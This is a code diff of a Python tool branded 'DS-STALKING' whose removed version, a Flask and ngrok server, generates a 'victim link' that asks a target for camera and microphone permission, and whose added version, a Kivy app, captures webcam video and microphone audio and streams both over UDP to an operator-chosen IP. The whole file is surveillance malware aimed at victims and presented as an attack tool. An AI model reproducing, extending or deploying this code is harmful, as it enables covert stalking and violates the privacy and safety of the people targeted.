@@ -1,84 +1,81 @@
-from flask import Flask, render_template, request, jsonify
+import cv2
 import socket
-import pyfiglet
-from pyngrok import ngrok, conf  # Import de Ngrok
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.graphics.texture import Texture
+from kivy.clock import Clock
+import pyaudio
+from pyfiglet import Figlet
 
-# Créer une interface ASCII art avec pyfiglet
-def display_interface():
-    custom_fig = pyfiglet.Figlet(font="small")
-    ascii_art_text = custom_fig.renderText("DS-STALKING")
-    info = [
-        "BY: 2806",
-        "Telegram: t.me/Mr_2806",
-        "Tiktok: dedsec_x.0",
-        "Youtube: Dedsec assistant"
-    ]
-    border = "=" * 40
-    print(border)
-    print(ascii_art_text)
-    for line in info:
-        print(f"  {line}")
-    print(border)
+class CameraApp(BoxLayout):
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
 
-# Afficher l'interface ASCII au démarrage
-display_interface()
+        # Affichage ASCII
+        custom_fig = Figlet(font='slant')
+        ascii_art_text = custom_fig.renderText("DS-STALKING")
+        info = [
+            "BY: 2806",
+            "Telegram: t.me/Mr_2806",
+            "Tiktok: dedsec_x.0",
+            "Youtube: Dedsec assistant"
+        ]
+        print(ascii_art_text)
+        print("\n".join(info))
 
-# Création de l'application Flask
-app = Flask(__name__)
+        # Demande de l'adresse IP à l'utilisateur
+        self.host = input("Entrez l'adresse IP de votre téléphone (Termux) : ")
+        self.video_port = 5000
+        self.audio_port = 5001
 
-# Obtenir l'adresse IP locale
-def get_local_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-    except Exception:
-        ip = "127.0.0.1"
-    finally:
-        s.close()
-    return ip
+        self.capture = cv2.VideoCapture(0)
+        Clock.schedule_interval(self.update_frame, 1.0 / 30.0)
+        self.video_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.audio_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-# Route pour la page principale
-@app.route("/")
-def index():
-    return render_template("index.html")
+        # Configuration audio avec PyAudio
+        self.p = pyaudio.PyAudio()
+        self.audio_stream = self.p.open(format=pyaudio.paInt16,
+                                        channels=1,
+                                        rate=44100,
+                                        input=True,
+                                        frames_per_buffer=1024)
 
-# Route pour générer le lien à envoyer à la victime
-@app.route("/generate_victim_link", methods=["POST"])
-def generate_victim_link():
-    input_link = request.form['input_link']
-    
-    # Lien Ngrok public généré
-    public_url = ngrok.connect(5000).public_url  # Ngrok sur le port 5000
-    victim_link = f"{public_url}/victim_permission"
-    
-    print(f"Lien généré pour la victime : {victim_link}")
-    return render_template("generated_link.html", victim_link=victim_link)
+        Clock.schedule_interval(self.stream_audio, 0.05)
 
-# Route pour demander la permission de caméra et micro
-@app.route("/victim_permission")
-def victim_permission():
-    return render_template("victim_permission.html")
+    def update_frame(self, dt):
+        ret, frame = self.capture.read()
+        if ret:
+            # Conversion OpenCV à Kivy Texture
+            buf = cv2.flip(frame, 0).tobytes()
+            texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='bgr')
+            texture.blit_buffer(buf, colorfmt='bgr', bufferfmt='ubyte')
+            self.canvas.clear()
+            with self.canvas:
+                self.rectangle = texture
 
-# Route pour commencer le stream
-@app.route("/start_stream", methods=["POST"])
-def start_stream():
-    stream_url = f"http://{local_ip}:5000/stream"
-    return jsonify({"stream_url": stream_url})
+            # Envoi du flux vidéo en UDP
+            _, buffer = cv2.imencode('.jpg', frame)
+            self.video_socket.sendto(buffer.tobytes(), (self.host, self.video_port))
 
-# Route pour afficher le flux vidéo et audio
-@app.route("/stream")
-def stream():
-    return render_template("stream.html")
+    def stream_audio(self, dt):
+        # Capture et envoi de l'audio
+        audio_data = self.audio_stream.read(1024)
+        self.audio_socket.sendto(audio_data, (self.host, self.audio_port))
 
-# Lancer le serveur Flask
-if __name__ == "__main__":
-    # Ajouter le chemin vers Ngrok si nécessaire
-    conf.get_default().ngrok_path = "/data/data/com.termux/files/usr/bin/ngrok"  # Remplacez par le chemin correct
+    def stop(self):
+        self.capture.release()
+        self.audio_stream.stop_stream()
+        self.audio_stream.close()
+        self.video_socket.close()
+        self.audio_socket.close()
+        self.p.terminate()
 
-    # Fixer un port unique
-    port = 5000
-    local_ip = get_local_ip()
-    
-    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
-    app.run(host="0.0.0.0", port=port)
+
+class DSStalkingApp(App):
+    def build(self):
+        return CameraApp()
+
+
+if __name__ == '__main__':
+    DSStalkingApp().run()
